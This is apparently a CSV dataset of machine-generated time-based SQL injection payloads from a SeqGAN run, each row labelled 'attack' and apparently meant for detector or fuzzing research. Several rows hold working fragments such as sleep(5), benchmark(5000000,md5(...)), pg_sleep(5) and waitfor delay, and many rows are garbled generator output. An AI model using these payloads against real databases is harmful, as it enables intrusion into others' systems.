label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )  select  )  and   j  =  =  (  =  =  6967  5  )    'rse 5      =  =  =  =  =  =  'hrta'  =  =  select  =  =  =  5   )    )  )  )  )    )    )     ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,225
attack,"1"" or sleep  =  =  =  =    0x544d5a4c  )  )  =  0x544d5a4c  (  5   )     )  )    )  select  (  (  5000000,5     x  1132 or  1210,sleep  )  (  (  5  'y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,226
attack,"1""      8 from   0x694a4745   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,227
attack,"1%""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,228
attack,1   )  smdkfzhr t  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,229
attack,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'g'  =  'no  5    )     )  )   )    )   )  =""   (  )   and)   #upddddd  o  =  ""%""  =  )  )    )     )  (  =  =  =  select,sleep  5000000,md5  (  5    =select or  =  5    )    )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,230
attack,"1%%""   (  5    ast1 ,lh5   )  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231
attack,1    (  1210  =  =  =  1210  5  --y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232
attack,"1""  )  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233
attack,1m  )  1679a  and   (    (  (  5  )  5    )    (  5  )  s  u=  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,234
attack,"1""   )     )   )    )    )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,235
attack,"1  ( 3114  1568 where from   5    )  and 8594  =  =   or 8252  (  (  select 3824  (  =  0x544d5a4c  =  =  1210  =  =  select orsleep  1132 or * 42405  =  benchmark  (  (  benchmark  0x694a4745  )  )  sleep  ""%""  5   #uviq  select  (  select or  =  =  =  (  =  (  =  select 2044  benchmark  5    )    )  )  )    )    )    )     )      )    )  )  )    )    )    )  6866  ""zlal""     )",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,236
attack,  5  vi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,237
attack,n'   )    )     )   and sleep  (  5  )   and    (    (     (  'fu'  =  'rlbselect  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,238
attack,1'  )  )    fy,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,239
attack,"  (  sleep  (  sleep  ""%""  =  =  (  0x544d5a4c   )   )  )  )    )   8594",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,240
attack, * from   (  (  (   or  =  (  =  1568  =  4683  (  =  select  (  sleep  0x544d5a4c   --yq  )  )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,241
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""cr)    )  ) or pg_sleep  6175 where * '0:0:5')    (  e  )  )    )     )  )    )  )  )   )    )     )    )   )   where 6969  =  select  5000000  sleep  (  =  5  )  =  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,242
attack,"1%""  )  )   )   and)  )  )  (  )  (  =  sleep",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,243
attack,"1""  =  =  =  =  =    (    (  (  6272  =  1210  (  (  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,244
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ''   )  sr t  )  1915i,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,245
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ''  =  ''",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,246
attack,1'  sddidik)    )   where from   (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,247
attack,"  =  #  select  5    )     )    )  )    )  'hrta'  sleep  =  =  =  =  =  (  8507o  =  ""%""  =    (     5   s   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,248
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""w'  =  '00:5,  sleep  (  =  =  sleep  =  (  ' where or pg_sleep(  select  (  5000000,sleep  5  )  )   )  (select or or  sleep  5  s  1915  select from   (  (  sleep    3672 6793 8485 pg_sleep(  (  =  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,249
attack,"1'  ))  )   and ,m",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,250
attack,"1%' and    (    (     (  'f "" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,251
attack,"1%%%+h  sleep  =  =  =  =  =  5   oras 8514  =  9008  =  1210,(  =  (  0x544d5a4c,)  5   )    )    )  )    )    )    )    )   where * * d5  )   (  5   )    (  e 7305  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,252
attack,"0:0::select where  (  sleep  =  =  5000000,sleep  =  sleep  =  0x76555642,8507  (  2239  5   q  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,253
attack,"ke or  =  ) where ,sleep  =  select  =  =  sleep  1210  3114(  =  0x544d5a4c   )  and  (  6793  =  (  (  5  )  )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254
attack,"1'  5   or  (  0x544d5a4c   )  (  select or    (  =    )  ( 5  (  (  2044  select  =  (  select pg_sleep5  benchmark  =  6272  =  benchmark  5,)  9008  benchmark  5  )    )  )  )  'rh  )  )  )  6272 sleep  =  select  (  sleep  6272  =  =  0x76555642    )    )  (  (  0x694a4745   )   =  selectg (  =  =  sleep  )  =  6866  0x76555642  ,,sleep  =  (  =  #  =  =  5000000,mdd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255
attack,"1%%"" like ""%'   )    )     )   and sleep  (  5  )   and    (    (     (  ''  =  'rfhfb6866vtf)  )r  )   )     )  )f'zafzq  ' and    (    (     (  '  )    )  )  vhf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256
attack,"     #)   )  =  =  select  =  select  =  =  5  )    (  ,  (  =  7021  (  sleep  0x694a4745  5  =  =  (  (    )    (  sleep  5   )    )  select   )    )    azz   yqselect # where select  =  =  1915  )  =  =  =  wh",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257
attack,  5  )   (u1132  =  =    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258
attack,"1 8594  sleep,sleep  =  =  5  )   )   )    )    )    )    )   and #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259
attack,"1""  0x544d5a4c  )  =w0 05  (    2044  =  sleep  =  (9008  s  =  =  0x544d5a4c   where#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260
attack,"1%%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  '  '  )    )  )   and)    )    )   and i  '%'  0x76555642 e(  )  =  =   (  sleep  5000000,md5  5  )  =  =  =  #  select)   and  =  0x694a4745   )    )    sleepd 6866  =  'fy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""b'   )    ast    or pg_sleep  5  )  )  sddo  h  =  (    (  0x4c4d6142    )  select or and * pg_sleep  sleep  ==  =  sleep  (  5000000  select  sleep    (  1210  =  select  )  benchmark  (  =  =  5   --y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262
attack,"select  =  (  =  5   (  1210(  select  (  select  (  )   )  (    sleep  =  =  =  '  )  )  6175t  =  =  5000000,md5pg_sleep  =6967  =  0x544d5a4c   (  ""wucy""  1568w  )    )    sestd5  )    )  5    )  )  #w       5000000,=  (  =  5  )  #pVo  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263
attack,"1  or  (  8507  8667  =  (  select,sleep  )  (  =  =  =  5  sriike  )  benchmark  sleep  5000000)  5000000,  0x4c4d6142  5   )  #y_)  =  )    )  )    --zzhzf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264
attack,1  =  =  'e where (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265
attack,5  )  )  )  )  (  =  6175,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266
attack,  )  )   and  5    )    )     )    )   )    )  # vfuv4,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pyhz"" like ""qvz"" like ""zrtz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268
attack,1'  =  '  )  )     as   )   (  pky,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269
attack,1' or 8594  =  5  )  )  )  )  )  )  )  )  )  sleep    )  )  vyu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270
attack,1'  )   )  #   )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271
attack,""" 7196  ) andselect  5    )   or    (  5   )  )  5    )    )     where 8485  =  =  (  =  =  =  =  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272
attack,"  3114and  select  (  2239  ""%""  sleep  =  =  =  =  =  5  (  #  #  select 9 from pg_sleep  =  1210  =  )  (  =  0x544d5a4c   (  select  6866  (  '  =  6175)  )    s  =  =  =  =  select 6793  =  5000000,md5  =  (  5     )    and  )  (    ,7305   or 4683  sleep  =  =  =  =  =    )  (  (  (  5  (q  #uy)   where wheret  (  =  (  =  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273
attack,1%r6fpf' like 'zcandf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274
attack,1 or 6175  5  )  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275
attack,"1%'+  (  select '0d5  select  0x544d5a4cf)  )    )   (    (  (d  =  3114,sleep  =  1568  =  (  #  )       (  sleep  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276
attack,"1"" or 6793  =  5  )    )  )   )    )   -- like fromhjo  )  ) f)  '   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277
attack,  =  5     )  )     )  vdiyq  )  )    )  )  #lq  )  sleep  (  select  5f)  (  )   (  )  =lavvwyqyz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278
attack,"1"" * or *(  0x544d5a4c  =  5  )  )  )    )    )  )   (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rlik1t  select   (  (  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280
attack,"1select      2841  =  5   )    )    )     1568 or  )  (  5or  (  (  5   where pg_sleep  =  =  =   (  =  sleep  5   )    )  )  )     (  ),#fvt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281
attack,1   )    ) )  s   )   )    )    )    aor blikelt  '   (  (   sleep  5  (dd  )  )  )  )  sleep  select  5  s ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282
attack,select 8485  5   (  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283
attack,"1""   )     )  )    andldlikx  3114sleep  )  (  =  =  )  )  =5  select or    (  ))  (  select  (  sleep  (  =  6272  =  =  5  )  e   (  5  )      ,'  sleep  benchmark  =  =  0x544d5a4c   )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284
attack,1%' where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285
attack,"5q  )    or(  select,sleep  select  (  sleep  =  (  (  =  sleep  3114  =  sleep  0x544d5a4c   )  where ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286
attack,"1"" or * or 3824  sleep  =  (  =  select  select  =  benchmark  )  sleep  =  5   )  ""uvzc""    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287
attack,z'  =  '%ptfvofpt  )  #avi   )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288
attack,"1%b%""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289
attack,1 *  =  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290
attack,"1%"" like ""%where",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291
attack,1'  )  )   )    )    )    )    asldotahyl' like 'tf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292
attack,"1'  )    )   )    )    )   )     )  )    )(  select orlt    '  =  5000000,sleep  1132  =  =  =  =benchmark  5  )    )  6969  )  =  =  8507  )  )    ) ru)     )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'x   and  sleep  0x76555642  =  =  =  =     )    )     #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294
attack,"1%""   pg_sleep  =  5  )    (  select)  )  )   )    )    )    or   orlike   or sleep  (  ""uvzc"" or or  =  =  =  =  = or  )  =  5   where sleep  =  =  =  0x544d5a4c  )    )  (y  (  sleep  (  5000000,mdd5    (      )  )  select  (  select  s",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295
attack,"1""  5  )    )   )    aawpyqpac",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '   ,md5  1132  5  '%'  )  sleep  5000000,),,  =  =  0x694a4745rarlix5  )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297
attack,"1'  )""  sdjkkwhere _fr waitfor ,md5  (  1132  =  =  =  =  5000000,md5  5  #f' like 'u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298
attack,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'hf'  =  'w,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299
attack,d  =  =  =  or  select  =  =  select  =  =  =  select  select  =  6967  benchmark  6272  sleep  (  5    )    )  su)       0x76555642  5  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300
attack,"1 where F)  =  benchmark  sleep  select  6175  (    (  vLmpd5  )  )yq  select 2239  =  or   6272,1568  =,(   (  benchmark  select from from    (   (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301
attack,1%'  )   -- j0:select  sleep  )  =  0x4c4d6142  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302
attack,"1""  5  )     where from  5  )  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303
attack,    select  5   )  #  j  =  --) --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304
attack,1')  )   and)    )    )    --o  y yyp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305
attack,1   )   (  )  )  )  )     )  s  #vt  (  s  select  =  =  1210  5  )    )  0x4c4d6142    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306
attack,"1'  )  5874  =  =  =  (  =  =  6866  (  select,=  =  6272sleep  =  =  6272,and  1210,2239  =  12105  5  7021  =  =  =  1210  =  =  =    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307
attack,"1'  )   )    )    )     )   )    )   )   --u and * not  (  =  =  sleep  =  =  =  sleep  =  select  sleep  3114  (  (  =  (  6272,=  5   )  #  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308
attack,""" I   )  (  (  (  select  )    )    (  (  7021  =  5   )   )     )   where * sleep  6272,sleep  (  sleep  select  )  sleep  (  (  select  (  3114  (  =   (  sleep  =  0x544d5a4c,)  (  2239  select  (  5  )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309
attack,select or benchmark  5    )    )  =  1915  1132 y sleep  (  select  (      (  (  =  =  6272    (  benchmark  select  5  )  v\ (f)    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310
attack,"1""  5  )   )     )    )    ) and  )     6793  5000000,md5  5    )  (  #  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311
attack,"1%T  =  select  )  =  =  5  sleep    # fc  select a where ,md  (  =  =  0x6d457153   or sleep  =  =  (  sleep  =  0x76555642,sddo  sleep  (  p    )  (    (  ssleep  =  )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312
attack,"  =  3672 sleep  select  select  sleep  "" benchmark  6272d from  =  =  =  6272  (  (  5  )   ),gp",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313
attack,"1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'c"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""'  =  '0x76555642   )   (  select or  where sleep  5000000,md5  (   ( 5874  =  5  )    )  )  )  (  yq  (  =  ),)  )    )d5  select  =  (  5000000,0x544d5a4c and  =l  5   )  )  #)  )  =  =  0x76555642   #     ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314
attack,"   _'  =  '  n like)  =  =  =  =  =  select  =  '  (  5000000,mq5  =  =  =  =  =  ""5  '  (  =  8252  select  8667  3824  )  (  ""  )  ,  =   (  #    (  select  4683  (  sleep  1210  sleep  4683  =  =  =  =  =  =  benchmark   (  sleep  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315
attack,"11""  )  )   where pg_sleep  (  (  select where <>  5    )    )    )  )   )    )    )  )   and)    )   (  6866w)  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316
attack,  5  )  )   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317
attack,"1%"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""'  =  =  =    --'  =  'rln",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318
attack,1   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%' where 1241  =  1241 waitfor delay 'ajf where * ,sleep  5  where sleep  =  0x544d5a4c,md5  =  6272  =  =  sleep  =  elmddo  0x4c4d6142--",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320
attack,1'  )   ' and   (  ' ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321
attack, 6793  1210  6383,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322
attack,  =  =  5   )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,323
attack,sleep  5    )   )    where pg_sleep  5  (      (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,324
attack,"1""  )  )   )     )  or *ld  =  3672  =  =  ""  sleep  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,325
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""h or 4240  7305  8252  (  5  sdd  e   (     )  )  (    )  5   xdd5  )   )    )    )    )    )  )  )  )  and  select,7196  6866  6272  benchmark  =  =  =  #  =  5  )  )    )  =    =  benchmark'r)  =  =  =  =  '%'  #o  )  #  =  6866  (  select  sleep  (  '%'  select  (  =  6967  (5  1210d5  (  select   (  5  )    )  )   )    )",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,326
attack,1%'  0x76555642  )   ord  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,327
attack,"1""  and   =  =  5000000,sleep  =  9008 or d5  =  =  =  =  1679  (  sleep  =  1210  sleep  benchmark  4683  5   (  ""uvzc""ap",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,328
attack,"1""  )   and",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,329
attack,"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'rrltaa'  =  ' xpoef",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,330
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%'  =  ''  =  '  2239o  )    )   )  sddintu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,331
attack,1waitfor (  5  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,332
attack,"1""   )   or *  =  sleep  =  1210  =  sleep  3114select  ( 4240 8594  (  5    )  select or  (  8485 or not  (  =  =  9649  (  =  =  =  5000000,5000000,0x544d5a4c,)sleep  5000000, 6967  select  5000000,md5  )  sleep  (   (  =  3114,(  =  =  =  =  =  mf  (  5  )  5   )  gcrvr",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,333
attack,"1%%or or  select  (  (  5   )     )  selke  (  =  select pg_sleep  =  =  (  5  )  =  =  =  =  benchmark  =  =  =  =  6272,=  select,  5000000, 8594  5    )  =    (      (  6272,sleep  1210  5   )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,334
attack,"1""r or *  select  =  =  2239 8485  5   or )  =  5000000,md5  (  2239    (  (  select  (  =  =  =  =  9008  =  sleep  (  =  =  select  =  0x544d5a4c  )  ""zlal""  5  )  #(",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,335
attack,"select(  sleep  (     sl  r  =  '  5000000,md5  (  =  =     (  =  0x544d5a4c  =  3824md5  =  #dyq  =  =  =  5  )   )    )    )     )  (  (  select    (  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,336
attack,"1 or and  8507  =  =  (  ""  (  (  =  =  0x694a4745   )    # or  (  =  'hrta'  (  =  =  =  =  1210,benchmark  or  =  =  5  rlef",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,337
attack,"  "" and or * or d5  =  =  =  5000000,,sleep  (     )  s  =  =  select  (  ""zlal""  5   )  ""uvzc""uv",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,338
attack,"1%""   )    )    )    )    )   --yya'  =  'l",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,339
